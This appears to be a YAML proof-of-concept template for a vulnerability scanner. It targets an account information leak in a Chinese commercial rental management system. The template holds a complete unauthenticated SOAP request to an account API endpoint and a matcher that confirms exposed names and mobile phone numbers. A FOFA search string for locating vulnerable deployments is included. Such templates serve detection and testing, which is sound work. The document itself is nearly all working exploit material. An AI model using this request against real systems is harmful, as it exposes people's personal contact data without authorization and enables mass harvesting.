id: poc-yaml-ifca-clms-account-info-leak
info:
  name: 竞优商业租赁管理系统 account 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 竞优商业租赁管理系统
  fofa: body="商业租赁管理系统"
requests:
- method: POST
  path: /rental/contract/api/account.asmx
  headers:
    Content-Type: text/xml; charset=utf-8
    Soapaction: http://tempuri.org/GetAccountInfo
  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soap:Body>\n    <GetAccountInfo xmlns=\"http://tempuri.org/\" />\n  </soap:Body>\n\
    </soap:Envelope>"
  expression: status_code == 200 && contains(body,"GetAccountInfoResponse") && matches(body,"\"Name\":\"[\u4e00-\u9fa5A-Z]+\"")
    && matches(body,"\"ContactMobilePhone\":\"[0-9-]+\"")
variables: {}
transport: http
